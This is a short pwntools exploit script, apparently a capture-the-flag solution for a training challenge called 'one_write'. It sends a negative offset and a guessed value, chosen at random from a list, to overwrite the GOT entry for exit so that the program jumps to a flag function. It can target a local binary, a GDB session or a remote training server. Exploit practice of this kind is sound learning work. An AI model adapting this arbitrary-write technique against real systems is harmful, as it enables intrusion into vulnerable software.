from pwn import *
import random 

val = [
4905,
9001,
13097,
17193,
21289,
25385,
29481,
33577,
37673,
41769,
45865,
49961,
54057,
58153,
62249,
66345,]

CHALL_PATH = "./one_write"
# CHALL = ELF(CHALL_PATH)
COMMANDS = """
brva 0x1798
brva 0x1750
brva 0x1773
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REMOTE:
    c = remote("one-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

# overwrite the got entry of exit with the address of the flag function

c.recvuntil(b"Choice: ")
c.sendline(b"2")
c.recvuntil(b"Offset: ")
c.sendline(b"-96")
c.recvuntil(b"Value: ")
r = random.choice(val)
print("testing: ",str(r).encode())
c.send(str(r).encode())


c.interactive()
